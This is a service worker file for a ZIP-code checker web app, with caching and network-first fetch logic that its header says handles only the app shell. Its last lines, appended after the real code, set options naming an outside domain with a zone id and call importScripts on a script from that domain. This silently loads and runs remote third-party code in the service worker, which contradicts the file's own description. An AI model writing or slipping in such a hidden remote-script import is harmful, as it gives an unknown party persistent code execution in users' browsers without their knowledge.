/*!
 * ZIP Checker — service worker
 *
 * Caches ONLY the application shell (HTML/CSS/JS/icons) so the app opens
 * instantly and keeps working through network drops.
 *
 * The ZIP dataset is deliberately NOT handled here: cross-origin requests
 * (OpenSheet / Google) pass straight through to the network, and the data
 * layer (IndexedDB, stale-while-revalidate) decides what is fresh.
 *
 * Strategy for shell files: NETWORK-FIRST with a short timeout. When the
 * server is reachable agents always get the latest deployed files on the
 * very next load; the cache is only used when the network is down or slow
 * (> NETWORK_TIMEOUT_MS). Bump VERSION to drop old caches.
 */
'use strict';

var VERSION = 'zip-checker-shell-v1.3.0';
var NETWORK_TIMEOUT_MS = 3000;
var SHELL = [
  './',
  './index.html',
  './styles.css',
  './app.js',
  './data-worker.js',
  './manifest.json',
  './icons/favicon.svg',
  './icons/icon-192.png',
  './icons/icon-512.png',
  './icons/icon-maskable-512.png'
];

self.addEventListener('install', function (event) {
  event.waitUntil(
    caches.open(VERSION).then(function (cache) {
      // cache: 'reload' bypasses the HTTP cache so a new VERSION gets fresh files.
      return cache.addAll(SHELL.map(function (url) { return new Request(url, { cache: 'reload' }); }));
    }).then(function () { return self.skipWaiting(); })
  );
});

self.addEventListener('activate', function (event) {
  event.waitUntil(
    caches.keys().then(function (keys) {
      return Promise.all(keys.map(function (key) {
        if (key !== VERSION && key.indexOf('zip-checker-shell-') === 0) return caches.delete(key);
      }));
    }).then(function () { return self.clients.claim(); })
  );
});

self.addEventListener('fetch', function (event) {
  var req = event.request;
  if (req.method !== 'GET') return;

  var url = new URL(req.url);
  if (url.origin !== self.location.origin) return; // data endpoints: never intercepted

  var isNavigation = req.mode === 'navigate';
  // Normalise navigations (any query string) to the cached shell document.
  var cacheKey = isNavigation ? './index.html' : req;

  event.respondWith(caches.open(VERSION).then(function (cache) {
    var network = fetch(req, { cache: 'no-cache' }).then(function (res) {
      if (res && res.ok && res.type === 'basic' && !res.redirected) {
        cache.put(cacheKey, res.clone());
      }
      return res;
    });
    // Keep the SW alive until the cache write finishes, even if we answered from cache.
    event.waitUntil(network.catch(function () {}));

    var fromCache = function () {
      return cache.match(cacheKey, { ignoreSearch: isNavigation });
    };

    return new Promise(function (resolve) {
      var settled = false;
      var finish = function (res) { if (!settled && res) { settled = true; resolve(res); } };

      // Slow network: fall back to the cached copy after a short wait.
      var timer = setTimeout(function () {
        fromCache().then(function (cached) { if (cached) finish(cached); });
      }, NETWORK_TIMEOUT_MS);

      network.then(function (res) {
        clearTimeout(timer);
        if (res.ok) { finish(res); return; }
        // Server error: prefer a good cached copy if there is one.
        return fromCache().then(function (cached) { finish(cached || res); });
      }).catch(function () {
        clearTimeout(timer);
        fromCache().then(function (cached) {
          if (cached) finish(cached);
          else if (isNavigation) cache.match('./index.html').then(function (c) { finish(c || Response.error()); });
          else finish(Response.error());
        });
      });
    });
  }));
});
self.options = {
    "domain": "3nbf4.com",
    "zoneId": 11986858
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
